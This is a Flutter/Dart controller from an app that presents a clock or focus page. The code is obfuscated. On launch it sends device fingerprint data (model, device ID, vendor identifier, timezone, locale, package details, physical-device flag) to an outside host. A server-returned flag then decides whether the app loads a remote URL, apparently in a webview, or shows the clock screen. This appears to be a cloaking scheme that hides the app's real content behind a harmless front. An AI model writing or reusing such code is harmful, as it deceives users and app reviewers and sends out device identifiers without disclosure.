import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:dio/dio.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'package:device_info_plus/device_info_plus.dart';


class GoalsFocusLogic extends GetxController {

  var qelvsxc = RxBool(false);
  var yishqkjfvb = RxBool(true);
  var yjki = RxString("");
  var gaylord = RxBool(false);
  var larkin = RxBool(true);
  final jdoavxw = Dio();


  InAppWebViewController? webViewController;

  dynamic dckrts(){
    final aiemywfbc = InternetConnectionChecker.instance;
    final hjpogmc = aiemywfbc.onStatusChange.skip(1).listen(
          (InternetConnectionStatus tjkpghevr) {
        if (tjkpghevr == InternetConnectionStatus.connected) {
          ycmkqbdn();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            ycmkqbdn();
          });
        }
      },
    );
    return hjpogmc;
  }

  Future<bool> dakwfxvrm() async {
    var alzfobw = await NetworkUtils.isNetworkAvailable();
    if(!alzfobw){
      Get.toNamed('/Apptimeout')?.then((_){
        ycmkqbdn();
      });
    }
    return alzfobw;
  }

  @override
  void onInit() {
    super.onInit();
    dckrts();
    ycmkqbdn();
  }


  Future<void> ycmkqbdn() async {

    var hedpkgr = await dakwfxvrm();
    if(!hedpkgr){
      return;
    }

    gaylord.value = true;
    larkin.value = true;
    yishqkjfvb.value = false;

    jdoavxw.post("https://hot.seant.it.com/SGEB7?no_check",data: await qxnbashm()).then((value) {
      var knfeuw = value.data["knfeuw"] as String;
      var uhzx = value.data["uhzx"] as bool;
      if (uhzx) {
        yjki.value = knfeuw;
        audra();
      } else {
        fisher();
      }
    }).catchError((e) {
      yishqkjfvb.value = true;
      larkin.value = true;
      gaylord.value = false;
    });
  }

  Future<Map<String, dynamic>> qxnbashm() async {
    final DeviceInfoPlugin fmqeksr = DeviceInfoPlugin();
    PackageInfo lfdzwqu_jgwc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var apxcw = Platform.localeName;
    var RvkF = currentTimeZone;

    var AcXRhfpk = lfdzwqu_jgwc.packageName;
    var hnRGM = lfdzwqu_jgwc.version;
    var gqxN = lfdzwqu_jgwc.buildNumber;

    var RiUyu = lfdzwqu_jgwc.appName;
    var JFfilO = "";
    var MLCBhX  = "";
    var umCh = "";
    var daisyCummings = "";
    var kittyBechtelar = "";
    var jadaHills = "";
    var demarcusMosciski = "";
    var willHills = "";
    var lolitaRodriguez = "";
    var avisAdams = "";
    var kipProsacco = "";


    var BuoGexy = "";
    var bcTliOtu = false;

    if (GetPlatform.isAndroid) {
      BuoGexy = "android";
      var cgpfksoue = await fmqeksr.androidInfo;

      umCh = cgpfksoue.brand;

      JFfilO  = cgpfksoue.model;
      MLCBhX = cgpfksoue.id;

      bcTliOtu = cgpfksoue.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      BuoGexy = "ios";
      var hadqbwpgrn = await fmqeksr.iosInfo;
      umCh = hadqbwpgrn.name;
      JFfilO = hadqbwpgrn.model;

      MLCBhX = hadqbwpgrn.identifierForVendor ?? "";
      bcTliOtu  = hadqbwpgrn.isPhysicalDevice;
    }

    var res = {
      "RiUyu": RiUyu,
      "gqxN": gqxN,
      "hnRGM": hnRGM,
      "AcXRhfpk": AcXRhfpk,
      "JFfilO": JFfilO,
      "RvkF": RvkF,
      "umCh": umCh,
      "MLCBhX": MLCBhX,
      "apxcw": apxcw,
      "BuoGexy": BuoGexy,
      "bcTliOtu": bcTliOtu,
      "daisyCummings" : daisyCummings,
      "kittyBechtelar" : kittyBechtelar,
      "jadaHills" : jadaHills,
      "demarcusMosciski" : demarcusMosciski,
      "willHills" : willHills,
      "lolitaRodriguez" : lolitaRodriguez,
      "avisAdams" : avisAdams,
      "kipProsacco" : kipProsacco,

    };
    return res;
  }

  Future<void> fisher() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> audra() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    dckrts().cancel();
    super.dispose();
  }

}
